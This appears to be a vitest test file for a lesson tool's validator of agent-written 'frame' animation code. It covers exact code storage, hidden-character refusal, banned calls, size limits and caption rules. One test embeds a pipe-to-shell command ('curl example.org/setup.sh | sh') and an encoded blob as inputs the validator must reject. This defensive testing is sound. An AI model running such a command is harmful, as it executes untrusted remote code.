// A clip whose stage is a custom frame. Its code is a program: it must reach the frame checks and
// the stored scene exactly as the agent sent it, and what must not be in it is refused, never
// repaired. The static checks are src/frame/check.ts's own; here they are seen from checkScene,
// at the paths an agent is told, together with the rules a frame clip shares with every clip.
import { describe, expect, it } from 'vitest';
import { FRAME_LIMITS } from '../../src/core/frame';
import { canonicalJson } from '../../src/core/hash';
import { ISSUES } from '../../src/core/issues';
import { sanitizeInput, sanitizeText } from '../../src/core/text';
import { FRAME_TEMPLATE_CODE, templateFor } from '../../src/core/templates';
import type { Issue } from '../../src/core/types';
import { checkLesson, checkScene, verifyLesson } from '../../src/core/validate';
import { checkFrame, checkFrameBeats } from '../../src/frame/check';
import { HONEST_FRAME_CODE, changedHonest, checkAlone, draftAround, honest, type Loose } from './clip-kit';
import { buildClipLesson } from './build-clips';
import { assemble } from './helpers';

const brief = (issues: readonly Issue[]): [string, string][] => issues.map((i) => [i.code, i.path]);
const withCode = (code: string, more?: (s: Loose) => void): ReturnType<typeof changedHonest> =>
  changedHonest('frame', (s) => {
    s.stage.code = code;
    more?.(s);
  });

/** Code with everything a sanitiser of prose would have changed: indentation, a tab, blank lines, a comment, CRLF, trailing spaces, a non-ASCII string. */
const AWKWARD = [
  '// Set-up.   Two spaces follow this line.  ',
  'const GAP = 12;\t// a tab before this comment',
  '',
  '',
  'function render(ctx, t) {',
  '    const { W, H, theme: c } = S;   ',
  '\tS.clear();\r',
  "  S.text('naïve  café — 2 × 2', W / 2, H / 2, { size: 24, fill: c.fg, align: 'center' });",
  '  /* a block comment',
  '     over two lines */',
  '  S.rect(GAP, GAP, W * S.prog(t, 0, 2), GAP, { fill: c.accent });',
  '}',
  '',
  '',
].join('\n');

describe('the code of a frame is stored exactly as it was sent', () => {
  it('a multi-line frame with indentation and a comment round-trips through checkScene unchanged', () => {
    const check = withCode(HONEST_FRAME_CODE);
    expect(check.errors).toEqual([]);
    expect((check.scene as Loose).stage.code).toBe(HONEST_FRAME_CODE);
    expect(HONEST_FRAME_CODE.split('\n').length).toBeGreaterThan(8);
    expect(HONEST_FRAME_CODE).toMatch(/^ {2}S\.clear\(\);$/m);
    expect(HONEST_FRAME_CODE).toMatch(/^\/\/ A bar/);
  });

  it('byte for byte: tabs, blank lines, trailing spaces, CRLF and text outside ASCII all survive', () => {
    expect(checkFrame({ ...honest('frame').stage, code: AWKWARD, params: [], aspect: '16:9', cites: ['e2'] }).issues).toEqual([]);
    const check = withCode(AWKWARD);
    expect([...check.errors, ...check.warnings]).toEqual([]);
    const stored = (check.scene as Loose).stage.code as string;
    expect(stored).toBe(AWKWARD);
    expect(Buffer.from(stored, 'utf8').equals(Buffer.from(AWKWARD, 'utf8'))).toBe(true);
  });

  it('also when the whole scene, or its stage, arrives as a JSON string', () => {
    const clip = honest('frame');
    clip.stage.code = AWKWARD;
    const asString = checkScene(JSON.stringify(clip), draftAround(clip));
    expect(asString.errors).toEqual([]);
    expect((asString.scene as Loose).stage.code).toBe(AWKWARD);
    const stageAsString = checkScene({ ...clip, stage: JSON.stringify(clip.stage) }, draftAround(clip));
    expect(stageAsString.errors).toEqual([]);
    expect((stageAsString.scene as Loose).stage.code).toBe(AWKWARD);
  });

  it('and through the whole lesson: what is published and hashed holds the code as written', () => {
    const parts = buildClipLesson({ depth: 'quick', size: 'min', stages: ['frame', 'words'] });
    const frame = parts.scenes.find((s) => (s as Loose).stage?.kind === 'frame') as Loose;
    frame.stage.code = AWKWARD;
    const report = checkLesson(assemble(parts));
    expect(report.errors).toEqual([]);
    const published = report.lesson!.scenes.find((s) => s.kind === 'clip' && s.stage.kind === 'frame') as Loose;
    expect(published.stage.code).toBe(AWKWARD);
    // The same after a trip through JSON, as the published file carries it.
    const again = verifyLesson(JSON.parse(JSON.stringify(report.lesson)));
    expect(again.errors).toEqual([]);
    expect(again.hash).toBe(report.hash);
    expect(canonicalJson(again.lesson)).toContain(JSON.stringify(AWKWARD).slice(1, -1));
  });

  it.each([
    ['a kind with a trailing space', (stage: Loose) => ({ ...stage, kind: 'frame ' })],
    ['a kind with a zero-width character in it', (stage: Loose) => ({ ...stage, kind: `fra${String.fromCodePoint(0x200b)}me` })],
    ['a kind with a line break after it', (stage: Loose) => ({ ...stage, kind: 'frame\n' })],
    ['the key "code " with a trailing space', (stage: Loose) => { const { code, ...rest } = stage; return { ...rest, 'code ': code }; }],
    ['the key "kind" with a soft hyphen in it', (stage: Loose) => { const { kind, ...rest } = stage; return { [`ki${String.fromCodePoint(0xad)}nd`]: kind, ...rest }; }],
    ['the key written after the code', (stage: Loose) => { const { kind, ...rest } = stage; return { ...rest, kind: ' frame' }; }],
  ])('%s is still a frame once tidied, and its code is still kept as sent', (_what, untidy) => {
    const clip = honest('frame');
    clip.stage.code = AWKWARD;
    const draft = draftAround(clip);
    const sent = { ...clip, stage: untidy(clip.stage) };
    const clean = sanitizeInput(sent) as Loose;
    expect(clean.stage.kind).toBe('frame');
    expect(clean.stage.code).toBe(AWKWARD);
    const check = checkScene(sent, draft);
    expect(check.errors).toEqual([]);
    expect((check.scene as Loose).stage.code).toBe(AWKWARD);
    expect(((check.scene as Loose).stage.code as string).length).toBe(AWKWARD.length);
    // The same when it arrives as a string of JSON.
    expect((checkScene(JSON.stringify(sent), draft).scene as Loose).stage.code).toBe(AWKWARD);
  });

  it('only a frame\'s code is kept: every other string of the clip is still cleaned', () => {
    const clip = honest('frame');
    clip.title = '  Half,\n and   half again  ';
    clip.stage.code = AWKWARD;
    const clean = sanitizeInput(clip) as Loose;
    expect(clean.title).toBe('Half, and half again');
    expect(clean.stage.code).toBe(AWKWARD);
    // A field named `code` anywhere else is text like any other.
    expect((sanitizeInput({ kind: 'lines', code: 'a\n  b' }) as Loose).code).toBe('a b');
    expect((sanitizeInput({ code: 'a\n  b' }) as Loose).code).toBe('a b');
  });
});

describe('what must not be in the code is refused, not repaired', () => {
  it('a text-direction control, by the frame check', () => {
    const code = HONEST_FRAME_CODE.replace('// A bar', '// A \u202Ebar');
    const check = withCode(code);
    expect(brief(check.errors)).toEqual([['FRAME_HIDDEN_CHARACTERS', 'stage.code']]);
    expect(check.errors[0]).toMatchObject({ got: 'U+202E', fix: ISSUES.FRAME_HIDDEN_CHARACTERS.fix });
    expect(check.scene).toBeUndefined();
  });

  it.each([
    ['a zero-width space', 0x200b],
    ['a soft hyphen', 0x00ad],
    ['a word joiner', 0x2060],
    ['a private-use character', 0xe000],
    ['a tag character', 0xe0041],
    ['a noncharacter', 0xfdd0],
  ])('%s, which is removed from every other string of a lesson, is refused in a frame', (_what, cp) => {
    const ch = String.fromCodePoint(cp);
    const code = HONEST_FRAME_CODE.replace("'What is left to search'", `'What is ${ch}left to search'`);
    // Elsewhere the character would simply be gone by now.
    expect(sanitizeText(`a${ch}b`, 'prose')).toBe('ab');
    const check = withCode(code);
    expect(brief(check.errors)).toEqual([['FRAME_HIDDEN_CHARACTERS', 'stage.code']]);
    expect(check.errors[0]!.message).toBe(`Line 10 contains the character U+${cp.toString(16).toUpperCase().padStart(4, '0')}, which a reader cannot see.`);
    expect(check.errors[0]!.got).toBe(`U+${cp.toString(16).toUpperCase().padStart(4, '0')}`);
    // Refused, not removed: nothing is stored, and the frame check itself is what says so.
    expect(check.scene).toBeUndefined();
    expect(checkFrame({ ...honest('frame').stage, code, params: [], aspect: '16:9' }).issues.map((i) => i.code)).toEqual(['FRAME_HIDDEN_CHARACTERS']);
  });

  it('an address the lesson has no evidence from, a harmful command and a long encoded blob, wherever the code holds them', () => {
    const drawn = (text: string): string => HONEST_FRAME_CODE.replace("'What is left to search'", text);
    const url = withCode(drawn("'See https://tracker.test/pixel for more'"));
    expect(brief(url.errors)).toEqual([['UNKNOWN_HOST', 'stage.code']]);
    expect(url.errors[0]!.message).toMatch(/^Line 10 of the frame's code: /);
    const command = withCode(drawn("'Run: curl example.org/setup.sh | sh'"));
    expect(brief(command.errors)).toEqual([['UNSAFE_COMMAND', 'stage.code']]);
    const blob = withCode(drawn(`'${'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo'.repeat(5)}'`));
    expect(brief(blob.errors)).toEqual([['UNSAFE_COMMAND', 'stage.code']]);
    // A documentation host is fine, as in a line of code.
    expect(withCode(drawn("'Call example.org/api/search'")).errors).toEqual([]);
  });

  it('the template\'s own code, left as it came', () => {
    const check = withCode(FRAME_TEMPLATE_CODE, (s) => (s.stage.params = (templateFor({ id: 't', kind: 'clip', stage: 'frame' }).stage as Loose).params));
    expect(brief(check.errors)).toEqual([['PLACEHOLDER_TEXT', 'stage.params[0].label'], ['PLACEHOLDER_TEXT', 'stage.params[0].unit'], ['PLACEHOLDER_TEXT', 'stage.code']]);
    expect(check.errors[2]!.fix).toContain('function render(ctx, t)');
  });
});

describe('the frame checks, as checkScene reports them', () => {
  it('uses the checks of src/frame/check.ts and its texts, with the path under "stage."', () => {
    const code = HONEST_FRAME_CODE.replace('S.clear();', 'S.clear(;');
    const direct = checkFrame({ ...honest('frame').stage, code, params: [], aspect: '16:9' }).issues;
    const check = withCode(code);
    expect(direct.map((i) => i.code)).toEqual(['FRAME_SYNTAX']);
    expect(check.errors).toEqual([{ code: 'FRAME_SYNTAX', severity: 'error', path: 'stage.code', message: direct[0]!.message, fix: direct[0]!.fix, sceneId: 'h-frame' }]);
  });

  it('points at the field: the poster, a slider, the code', () => {
    expect(brief(changedHonest('frame', (s) => (s.stage.poster = 8.5)).errors)).toEqual([['FRAME_POSTER_RANGE', 'stage.poster']]);
    const slider = { id: 'rate', label: 'How fast it shrinks', min: 5, max: 1, step: 1, value: 3 };
    const reads = HONEST_FRAME_CODE.replace('  S.clear();', '  S.clear();\n  const rate = S.params.rate;');
    expect(brief(withCode(reads, (s) => (s.stage.params = [slider])).errors)).toEqual([['FRAME_PARAM_RANGE', 'stage.params[0].min']]);
    expect(brief(withCode(reads).errors)).toEqual([['FRAME_PARAM_UNDECLARED', 'stage.code']]);
    const banned = withCode(HONEST_FRAME_CODE.replace('  S.clear();', "  S.clear();\n  fetch('/data');"));
    expect(brief(banned.errors)).toEqual([['FRAME_BANNED', 'stage.code']]);
    expect(banned.errors[0]!.message).toMatch(/^Line 7: /);
  });

  it('a warning of the frame checks is a warning of the scene, and does not reject it', () => {
    const random = withCode(HONEST_FRAME_CODE.replace('  S.clear();', '  S.clear();\n  const jitter = Math.random();'));
    expect(random.errors).toEqual([]);
    expect(brief(random.warnings)).toEqual([['FRAME_RANDOM', 'stage.code']]);
    expect(random.ok).toBe(true);
    const unused = changedHonest('frame', (s) => (s.stage.params = [{ id: 'rate', label: 'How fast it shrinks', min: 0, max: 10, step: 1, value: 5 }]));
    expect(brief(unused.warnings)).toEqual([['FRAME_PARAM_UNUSED', 'stage.params[0].id']]);
    expect(unused.ok).toBe(true);
  });

  it('the size limits: bytes by the check, characters and seconds by the schema', () => {
    expect(brief(withCode(`${HONEST_FRAME_CODE}// ${'x'.repeat(FRAME_LIMITS.codeBytes)}`).errors)).toEqual([['TOO_LONG', 'stage.code']]);
    expect(brief(changedHonest('frame', (s) => (s.stage.duration = 1)).errors)).toEqual([['BAD_VALUE', 'stage.duration']]);
    expect(brief(changedHonest('frame', (s) => (s.stage.aspect = '21:9')).errors)).toEqual([['BAD_VALUE', 'stage.aspect']]);
    expect(brief(changedHonest('frame', (s) => delete s.stage.poster).errors)).toEqual([['MISSING_FIELD', 'stage.poster']]);
  });
});

describe('the beats of a frame clip', () => {
  it('start at 0, rise, and stay inside the animation', () => {
    const ats = (values: (number | undefined)[]): ReturnType<typeof changedHonest> =>
      changedHonest('frame', (s) =>
        values.forEach((at, i) => {
          if (at === undefined) delete s.beats[i].at;
          else s.beats[i].at = at;
        }),
      );
    expect(ats([0, 1, 5.5]).errors).toEqual([]);
    expect(brief(ats([0.5, 1, 5.5]).errors)).toEqual([['FRAME_BEAT_TIME', 'beats[0].at']]);
    expect(brief(ats([0, 3, 3]).errors)).toEqual([['FRAME_BEAT_TIME', 'beats[2].at']]);
    expect(brief(ats([0, 5, 2]).errors)).toEqual([['FRAME_BEAT_TIME', 'beats[2].at']]);
    expect(brief(ats([0, 1, 8]).errors)).toEqual([['FRAME_BEAT_TIME', 'beats[2].at']]);
    expect(brief(ats([0, undefined, 5.5]).errors)).toEqual([['FRAME_BEAT_TIME', 'beats[1].at']]);
    // The same messages the frame check gives when asked directly.
    expect(ats([0, 5, 2]).errors[0]!.message).toBe(checkFrameBeats(8, [0, 5, 2])[0]!.message);
  });

  it('carry no actions: nothing on a frame can be named', () => {
    const check = changedHonest('frame', (s) => (s.beats[1].do = [{ verb: 'pulse', target: 'bar' }, { verb: 'focus' }]));
    expect(brief(check.errors)).toEqual([['BEAT_FIELD_NOT_ALLOWED', 'beats[1].do']]);
    expect(check.errors[0]!.message).toContain('Beat 2 has 2 actions');
    expect(check.errors[0]!.fix).toContain('call plan_lesson again with a typed stage kind');
    // An empty `do` is what the schema fills in, and is fine.
    expect(changedHonest('frame', (s) => (s.beats[1].do = [])).errors).toEqual([]);
  });

  it('may carry a prediction, but not the first', () => {
    const gate = { prompt: 'How much is left after three comparisons?', options: [{ text: 'An eighth', correct: true, feedback: 'Yes: a half of a half of a half.' }, { text: 'A third', correct: false, feedback: 'Each comparison halves; it does not take a third.' }] };
    expect(changedHonest('frame', (s) => (s.beats[2].gate = gate)).errors).toEqual([]);
    expect(brief(changedHonest('frame', (s) => (s.beats[0].gate = gate)).errors)).toEqual([['GATE_ON_FIRST_BEAT', 'beats[0].gate']]);
  });
});

describe('what a frame shares with every clip', () => {
  it('its captions are blocks: one of them cites, and each is held to the block rules', () => {
    const none = changedHonest('frame', (s) => (s.beats[1].caption = { type: 'framing', text: 'It shrinks, and shrinks again.' }));
    expect(brief(none.errors)).toEqual([['SCENE_NO_CITED_BLOCK', 'beats']]);
    const number = changedHonest('frame', (s) => (s.beats[1].caption.text = 'Each of the 512 comparisons halves the remaining search interval.'));
    expect(brief(number.errors)).toEqual([['NUMBER_NOT_IN_SOURCE', 'beats[1].caption.text']]);
    const long = changedHonest('frame', (s) => (s.beats[0].caption.text = 'This bar is everything that could still hold the target, all of it, every last item, from one end to the other end of it.'));
    expect(brief(long.errors)).toEqual([['WORDS_OVER_BUDGET', 'beats[0].caption']]);
  });

  it('its description is ordinary text: safe, and on a sourced frame its numbers are in the cited passages', () => {
    const unsafe = changedHonest('frame', (s) => (s.description = 'A wide bar shrinks to half its width three times. More at www.halving.test.'));
    expect(brief(unsafe.errors)).toEqual([['URL_IN_TEXT', 'description']]);
    const worked = changedHonest('frame', (s) => (s.description = 'A bar 640 units wide shrinks to 320, then 160, then 80.'));
    expect(worked.errors).toEqual([]);
    const sourced = changedHonest('frame', (s) => {
      s.stage.provenance = 'sourced';
      s.description = 'A bar 640 units wide shrinks to 320, then 160, then 80.';
    });
    expect(brief(sourced.errors)).toEqual([['NUMBER_NOT_IN_SOURCE', 'description']]);
    expect(sourced.errors[0]!.got).toBe('640, 320, 160, 80');
  });

  it('a sourced frame cites, by the frame check; a worked one cites, by the rule for every stage', () => {
    const sourced = changedHonest('frame', (s) => Object.assign(s.stage, { provenance: 'sourced', cites: [] }));
    expect(brief(sourced.errors)).toEqual([['FRAME_SOURCED_NO_CITES', 'stage.cites']]);
    const worked = changedHonest('frame', (s) => (s.stage.cites = []));
    expect(brief(worked.errors)).toEqual([['STAGE_NO_CITES', 'stage.cites']]);
    expect(changedHonest('frame', (s) => Object.assign(s.stage, { provenance: 'illustrative', cites: [] })).errors).toEqual([]);
    expect(brief(changedHonest('frame', (s) => (s.stage.cites = ['e7'])).errors)).toEqual([['CITE_UNKNOWN', 'stage.cites[0]']]);
  });

  it('its slider labels are text of the lesson', () => {
    const reads = HONEST_FRAME_CODE.replace('  S.clear();', '  S.clear();\n  const rate = S.params.rate;');
    const check = withCode(reads, (s) => (s.stage.params = [{ id: 'rate', label: 'See www.rate.test', min: 0, max: 10, step: 1, value: 5 }]));
    expect(brief(check.errors)).toEqual([['URL_IN_TEXT', 'stage.params[0].label']]);
  });

  it('the honest frame clip passes clean', () => {
    const check = checkAlone(honest('frame'));
    expect([...check.errors, ...check.warnings]).toEqual([]);
    expect(check.metrics).toMatchObject({ steps: [10, 7, 7], budget: { per: 'beat' } });
  });
});
